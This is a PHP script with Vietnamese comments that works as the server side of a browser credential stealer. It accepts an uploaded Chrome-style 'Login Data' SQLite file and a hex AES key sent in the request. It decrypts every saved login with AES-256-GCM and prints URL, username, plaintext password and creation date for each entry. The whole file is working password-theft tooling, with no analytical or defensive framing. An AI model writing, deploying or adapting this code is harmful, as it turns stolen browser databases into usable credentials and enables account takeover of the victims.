<?php

function getPasswords($uploadedDbFile, $decryptionKey) {
    $totalPasswords = 0; // Biến để đếm tổng số mật khẩu

    // Kiểm tra xem file db có được tải lên hay không
    if (!file_exists($uploadedDbFile)) {
        echo "Database file not found.\n";
        return 0;
    }

    // Sao chép file tải lên vào thư mục tạm
    $passwordsDbPath = sys_get_temp_dir() . '/uploaded_passwords.db';
    if (!copy($uploadedDbFile, $passwordsDbPath)) {
        echo "Failed to copy the database file.\n";
        return 0;
    }

    // Kết nối tới cơ sở dữ liệu SQLite
    $db = new SQLite3($passwordsDbPath);
    if (!$db) {
        echo "Failed to connect to the database.\n";
        return 0;
    }

    // Truy vấn dữ liệu từ bảng logins
    $query = 'SELECT origin_url, username_value, password_value, date_created FROM logins';
    $results = $db->query($query);
    if (!$results) {
        echo "Failed to execute query on the database.\n";
        $db->close();
        return 0;
    }

    // Duyệt qua các bản ghi và giải mã mật khẩu
    while ($row = $results->fetchArray(SQLITE3_ASSOC)) {
        if (empty($row['username_value'])) {
            continue; // Bỏ qua nếu không có tên người dùng
        }

        try {
            $encryptedValue = $row['password_value'];
            $iv = substr($encryptedValue, 3, 12);
            $encryptedData = substr($encryptedValue, 15, strlen($encryptedValue) - 31);
            $authTag = substr($encryptedValue, -16);

            $cipher = "aes-256-gcm";
            $key = hex2bin($decryptionKey); // Sử dụng key từ tham số GET

            // Giải mã dữ liệu
            $decrypted = openssl_decrypt($encryptedData, $cipher, $key, OPENSSL_RAW_DATA, $iv, $authTag);
            if ($decrypted === false) {
                echo "Decryption failed for URL: " . $row['origin_url'] . "\n";
                continue;
            }

            $dateCreated = date('Y-m-d H:i:s', $row['date_created'] / 1000000 - 11644473600);

            // In ra định dạng yêu cầu
            echo $row['origin_url'] . "|" . $row['username_value'] . "|" . $decrypted . "|" . $dateCreated . "\n";

            $totalPasswords++; // Tăng biến đếm khi tìm thấy mật khẩu
        } catch (Exception $e) {
            echo "Error decrypting password for URL: " . $row['origin_url'] . "\n";
        }
    }

    $db->close();

    // Trả về tổng số mật khẩu tìm được
    return $totalPasswords;
}

// Phần main xử lý yêu cầu
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_GET['key']) && isset($_FILES['dbfile'])) {
    $uploadedDbFile = $_FILES['dbfile']['tmp_name'];
    $decryptionKey = $_GET['key'];

    // Kiểm tra khóa giải mã có hợp lệ không (chỉ hex)
    if (!ctype_xdigit($decryptionKey)) {
        echo "Invalid decryption key format. Please provide a hexadecimal key.\n";
        exit;
    }

    // Gọi hàm getPasswords với file tải lên và khóa giải mã
    $totalPasswords = getPasswords($uploadedDbFile, $decryptionKey);
if($totalPasswords==0){echo "No password found";}
} else {
    // Trả về thông báo lỗi nếu yêu cầu không đúng
    echo "Please provide a database file and decryption key.\n";
}
